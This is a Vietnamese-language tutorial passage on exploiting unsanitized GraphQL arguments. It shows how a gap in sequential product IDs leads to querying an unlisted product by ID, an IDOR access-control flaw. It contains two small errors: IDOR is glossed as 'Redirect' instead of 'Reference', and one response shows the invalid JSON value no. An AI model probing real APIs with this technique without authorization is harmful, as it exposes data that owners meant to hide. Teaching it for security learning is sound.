# Exploiting unsanitized arguments - Khai thác các đối số không được kiểm tra

Tại thời điểm này, chúng ta có thể bắt đầu tìm kiếm các lỗ hổng. Kiểm tra **query arguments** là một điểm khởi đầu tốt.

Nếu API sử dụng arguments để truy cập đối tượng trực tiếp, nó có thể dễ bị lỗ hổng kiểm soát truy cập. Một người dùng có thể truy cập thông tin mà họ không nên có bằng cách **cung cấp một arguments tương ứng với thông tin đó**. Điều này đôi khi được gọi là **Insecure Direct Object Redirect** - tham chiếu đối tượng trực tiếp không an toàn (IDOR).

# Exploiting unsanitized arguments - Continued

Ví dụ, truy vấn dưới đây yêu cầu danh sách sản phẩm cho một cửa hàng trực tuyến:

    #Example product query

    query {
        products {
            id
            name
            listed
        }
    }

Danh sách sản phẩm trả về chỉ bao gồm các sản phẩm đã được liệt kê. 

    #Example product response

    {
        "data": {
            "products": [
                {
                    "id": 1,
                    "name": "Product 1",
                    "listed": true
                },
                {
                    "id": 2,
                    "name": "Product 2",
                    "listed": true
                },
                {
                    "id": 4,
                    "name": "Product 4",
                    "listed": true
                }
            ]
        }
    }

Từ thông tin này, chúng ta có thể suy ra các điều sau:

- Các sản phẩm được gán một ID tuần tự.
- ID sản phẩm 3 bị thiếu trong danh sách, có thể do nó đã bị gỡ bỏ khỏi danh sách.

Bằng cách truy vấn ID của sản phẩm bị thiếu, chúng ta có thể lấy được chi tiết của nó, mặc dù nó không được liệt kê trên cửa hàng và không được trả về bởi truy vấn sản phẩm ban đầu.

    #Query to get missing product

    query {
        product(id: 3) {
            id
            name
            listed
        }
    }

Phản hồi cho sản phẩm bị thiếu:

    #Missing product response

    {
        "data": {
            "product": {
            "id": 3,
            "name": "Product 3",
            "listed": no
            }
        }
    }